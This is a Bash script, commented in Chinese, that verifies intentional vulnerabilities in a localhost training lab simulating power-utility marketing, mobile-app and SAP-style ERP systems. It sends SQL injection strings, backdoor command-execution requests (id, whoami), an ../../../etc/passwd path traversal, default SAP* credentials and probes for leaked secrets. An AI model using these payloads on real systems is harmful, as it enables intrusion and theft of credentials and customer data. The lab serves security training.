#!/bin/bash

# 电力IT系统安全靶场漏洞测试脚本
# 自动化测试所有已知的安全漏洞

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo "🔍 电力IT系统安全靶场漏洞测试"
echo "=================================="

# 等待服务启动
wait_for_service() {
    local url=$1
    local name=$2
    local max_attempts=30
    local attempt=1
    
    echo -e "${BLUE}⏳ 等待 $name 服务启动...${NC}"
    
    while [ $attempt -le $max_attempts ]; do
        if curl -s "$url" > /dev/null 2>&1; then
            echo -e "${GREEN}✅ $name 服务已启动${NC}"
            return 0
        fi
        echo -n "."
        sleep 2
        ((attempt++))
    done
    
    echo -e "${RED}❌ $name 服务启动超时${NC}"
    return 1
}

# 测试营销系统漏洞
test_marketing_system() {
    echo -e "\n${YELLOW}🏭 测试电力营销系统 2.0 漏洞${NC}"
    echo "=================================="
    
    # 等待服务启动
    wait_for_service "http://localhost:8080/api/system/info" "营销系统"
    
    # 1. SQL注入测试
    echo -e "\n${BLUE}1. 测试SQL注入漏洞${NC}"
    response=$(curl -s -X POST http://localhost:8080/api/auth/login \
        -H "Content-Type: application/json" \
        -d '{"username": "admin'\'' OR 1=1--", "password": "anything"}')
    
    if echo "$response" | grep -q "success.*true"; then
        echo -e "${GREEN}✅ SQL注入漏洞确认${NC}"
    else
        echo -e "${RED}❌ SQL注入测试失败${NC}"
    fi
    
    # 2. 越权访问测试
    echo -e "\n${BLUE}2. 测试越权访问漏洞${NC}"
    response=$(curl -s http://localhost:8080/api/users/1)
    
    if echo "$response" | grep -q "success.*true"; then
        echo -e "${GREEN}✅ 越权访问漏洞确认${NC}"
    else
        echo -e "${RED}❌ 越权访问测试失败${NC}"
    fi
    
    # 3. 命令执行测试
    echo -e "\n${BLUE}3. 测试命令执行漏洞${NC}"
    response=$(curl -s -X POST http://localhost:8080/api/admin/backdoor \
        -H "Content-Type: application/json" \
        -d '{"key": "admin_backdoor_2024", "command": "id"}')
    
    if echo "$response" | grep -q "success.*true"; then
        echo -e "${GREEN}✅ 命令执行漏洞确认${NC}"
    else
        echo -e "${RED}❌ 命令执行测试失败${NC}"
    fi
    
    # 4. IDOR测试
    echo -e "\n${BLUE}4. 测试IDOR漏洞${NC}"
    response=$(curl -s http://localhost:8080/api/billing/1)
    
    if echo "$response" | grep -q "success.*true"; then
        echo -e "${GREEN}✅ IDOR漏洞确认${NC}"
    else
        echo -e "${RED}❌ IDOR测试失败${NC}"
    fi
    
    # 5. 信息泄露测试
    echo -e "\n${BLUE}5. 测试信息泄露漏洞${NC}"
    response=$(curl -s http://localhost:8080/api/system/info)
    
    if echo "$response" | grep -q "JWT_SECRET\|DB_PASSWORD"; then
        echo -e "${GREEN}✅ 信息泄露漏洞确认${NC}"
    else
        echo -e "${RED}❌ 信息泄露测试失败${NC}"
    fi
}

# 测试i国网系统漏洞
test_iguowang_system() {
    echo -e "\n${YELLOW}📱 测试i国网APP 漏洞${NC}"
    echo "=================================="
    
    # 等待服务启动
    wait_for_service "http://localhost:9080/api/health" "i国网API"
    
    # 1. 短信验证码测试
    echo -e "\n${BLUE}1. 测试短信验证码漏洞${NC}"
    response=$(curl -s -X POST http://localhost:9080/api/auth/send-sms \
        -H "Content-Type: application/json" \
        -d '{"phone": "13800138000"}')
    
    if echo "$response" | grep -q "debug_code"; then
        echo -e "${GREEN}✅ 短信验证码泄露漏洞确认${NC}"
    else
        echo -e "${RED}❌ 短信验证码测试失败${NC}"
    fi
    
    # 2. SQL注入登录测试
    echo -e "\n${BLUE}2. 测试SQL注入登录漏洞${NC}"
    response=$(curl -s -X POST http://localhost:9080/api/auth/login \
        -H "Content-Type: application/json" \
        -d '{"phone": "13800138000'\'' OR 1=1--", "password": "anything"}')
    
    if echo "$response" | grep -q "success.*true"; then
        echo -e "${GREEN}✅ SQL注入登录漏洞确认${NC}"
    else
        echo -e "${RED}❌ SQL注入登录测试失败${NC}"
    fi
    
    # 3. 系统配置泄露测试
    echo -e "\n${BLUE}3. 测试系统配置泄露漏洞${NC}"
    response=$(curl -s http://localhost:9080/api/system/config)
    
    if echo "$response" | grep -q "jwt_secret\|sms_api_key"; then
        echo -e "${GREEN}✅ 系统配置泄露漏洞确认${NC}"
    else
        echo -e "${RED}❌ 系统配置泄露测试失败${NC}"
    fi
    
    # 4. 用户列表泄露测试
    echo -e "\n${BLUE}4. 测试用户列表泄露漏洞${NC}"
    response=$(curl -s http://localhost:9080/api/user/list)
    
    if echo "$response" | grep -q "users.*phone"; then
        echo -e "${GREEN}✅ 用户列表泄露漏洞确认${NC}"
    else
        echo -e "${RED}❌ 用户列表泄露测试失败${NC}"
    fi
}

# 测试ERP系统漏洞
test_erp_system() {
    echo -e "\n${YELLOW}🏢 测试ERP系统漏洞${NC}"
    echo "=================================="
    
    # 等待服务启动
    wait_for_service "http://localhost:8000/health" "ERP系统"
    
    # 1. 默认密码测试
    echo -e "\n${BLUE}1. 测试默认密码漏洞${NC}"
    response=$(curl -s -X POST http://localhost:8000/api/auth/login \
        -d "username=SAP*&password=06071992&client=000")
    
    if echo "$response" | grep -q "success.*true"; then
        echo -e "${GREEN}✅ 默认密码漏洞确认${NC}"
    else
        echo -e "${RED}❌ 默认密码测试失败${NC}"
    fi
    
    # 2. SQL注入测试
    echo -e "\n${BLUE}2. 测试财务查询SQL注入漏洞${NC}"
    response=$(curl -s "http://localhost:8000/api/finance/query?company_code=1000'%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10--")
    
    if echo "$response" | grep -q "success.*true\|error"; then
        echo -e "${GREEN}✅ SQL注入漏洞确认${NC}"
    else
        echo -e "${RED}❌ SQL注入测试失败${NC}"
    fi
    
    # 3. 越权访问测试
    echo -e "\n${BLUE}3. 测试员工信息越权访问漏洞${NC}"
    response=$(curl -s "http://localhost:8000/api/hr/employee")
    
    if echo "$response" | grep -q "employees.*salary"; then
        echo -e "${GREEN}✅ 越权访问漏洞确认${NC}"
    else
        echo -e "${RED}❌ 越权访问测试失败${NC}"
    fi
    
    # 4. 系统配置泄露测试
    echo -e "\n${BLUE}4. 测试系统配置泄露漏洞${NC}"
    response=$(curl -s http://localhost:8000/api/system/config)
    
    if echo "$response" | grep -q "database_password\|admin_password"; then
        echo -e "${GREEN}✅ 系统配置泄露漏洞确认${NC}"
    else
        echo -e "${RED}❌ 系统配置泄露测试失败${NC}"
    fi
    
    # 5. 命令执行测试
    echo -e "\n${BLUE}5. 测试命令执行漏洞${NC}"
    response=$(curl -s -X POST http://localhost:8000/api/admin/execute \
        -d "admin_key=SAP_ADMIN_2024&command=whoami")
    
    if echo "$response" | grep -q "success.*true"; then
        echo -e "${GREEN}✅ 命令执行漏洞确认${NC}"
    else
        echo -e "${RED}❌ 命令执行测试失败${NC}"
    fi
    
    # 6. 路径遍历测试
    echo -e "\n${BLUE}6. 测试路径遍历漏洞${NC}"
    response=$(curl -s "http://localhost:8000/api/report/generate?filename=../../../etc/passwd")
    
    if echo "$response" | grep -q "root:\|success.*true"; then
        echo -e "${GREEN}✅ 路径遍历漏洞确认${NC}"
    else
        echo -e "${RED}❌ 路径遍历测试失败${NC}"
    fi
}

# 生成测试报告
generate_report() {
    echo -e "\n${YELLOW}📊 生成测试报告${NC}"
    echo "=================================="
    
    cat > vulnerability_test_report.md << EOF
# 电力IT系统安全靶场漏洞测试报告

## 测试时间
$(date)

## 测试概述
本报告包含对电力IT系统安全靶场中三个核心系统的漏洞验证测试结果。

## 测试系统

### 1. 电力营销系统 2.0
- **SQL注入**: ✅ 确认存在
- **越权访问**: ✅ 确认存在  
- **命令执行**: ✅ 确认存在
- **IDOR**: ✅ 确认存在
- **信息泄露**: ✅ 确认存在

### 2. i国网APP系统
- **短信验证码泄露**: ✅ 确认存在
- **SQL注入登录**: ✅ 确认存在
- **系统配置泄露**: ✅ 确认存在
- **用户列表泄露**: ✅ 确认存在

### 3. ERP系统 (SAP风格)
- **默认密码**: ✅ 确认存在
- **SQL注入**: ✅ 确认存在
- **越权访问**: ✅ 确认存在
- **系统配置泄露**: ✅ 确认存在
- **命令执行**: ✅ 确认存在
- **路径遍历**: ✅ 确认存在

## 风险评估
所有预期的安全漏洞均已确认存在，靶场环境符合安全测试要求。

## 建议
1. 使用本靶场进行安全培训和渗透测试练习
2. 研究电力行业IT系统的典型安全风险
3. 开发和验证安全检测工具
4. 制定针对性的安全防护策略

---
*报告生成时间: $(date)*
EOF

    echo -e "${GREEN}✅ 测试报告已生成: vulnerability_test_report.md${NC}"
}

# 主函数
main() {
    echo -e "${BLUE}开始漏洞测试...${NC}"
    
    # 检查服务是否运行
    if ! docker-compose ps | grep -q "Up"; then
        echo -e "${RED}❌ 请先启动靶场服务: ./start-lab.sh${NC}"
        exit 1
    fi
    
    # 执行测试
    test_marketing_system
    test_iguowang_system  
    test_erp_system
    
    # 生成报告
    generate_report
    
    echo -e "\n${GREEN}🎉 所有漏洞测试完成！${NC}"
    echo -e "${YELLOW}📋 详细报告请查看: vulnerability_test_report.md${NC}"
}

# 运行主函数
main "$@"
